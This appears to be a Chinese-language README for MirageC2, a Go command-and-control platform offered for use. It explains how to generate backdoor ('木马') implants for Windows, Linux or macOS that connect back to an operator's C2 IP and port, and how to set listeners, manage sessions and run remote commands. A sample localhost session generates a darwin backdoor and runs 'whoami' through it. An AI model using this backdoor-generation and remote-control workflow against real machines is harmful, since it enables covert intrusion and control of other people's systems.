# MirageC2
一款基于golang开发的C2平台，在后续的开发中，将陆续完善其功能。

# 安装方式
在服务端，您的PC需要具备[golang](https://go.dev)的运行环境，用于生成木马。

# 使用方式
1. 运行可执行程序打开MirageC2服务器端。
```
> help:		输出帮助信息。
> create: 	通过Create参数来生成指定的Shell。例子: create <windows/linux/darwin> <C2IP:C2Port> <Save Path>
            [!] 注意如果使用create功能，您必须保证Server端拥有golang的运行环境。
> kill:		杀死指定的job或者session。例子：kill job <id>
> listen:  	在本地设置侦听的端口。例子: listen 127.0.0.1:8888
> show: 	[jobs,sessions]查看侦听的端口以及能够命令控制的会话。例如：show sessions
> session:	进入到指定会话中进行命令执行。例子: session <id>
```
2. 使用案例
```
Mirage Control > listen 127.0.0.1:8888
[+] Jobs Set: listen ip 127.0.0.1:8888
Mirage Control > create darwin 127.0.0.1:8888 mirage
[+] 已经成功输出后门程序至指定的目录！
[!] 如果您还未进行侦听，请运行：listen 127.0.0.1:8888
Mirage Control >  
[+] Sessions 1 Online: 127.0.0.1:52056 -> 127.0.0.1:8888 
Mirage Control > show sessions
[*] Job ID: "1", Client IP: "127.0.0.1:52057", Shell User: "deepmountains", Platform: "darwin", ProcessName: "mirage"
Mirage Control > session 1
Mirage Control -> Session1 > whoami
[+] Command ID: 0 
[-+] Result: --------------- 
deepmountains
[-+] Result: ---------------
Mirage Control -> Session1 > exit
[*] Sessions 1 将被挂起
```
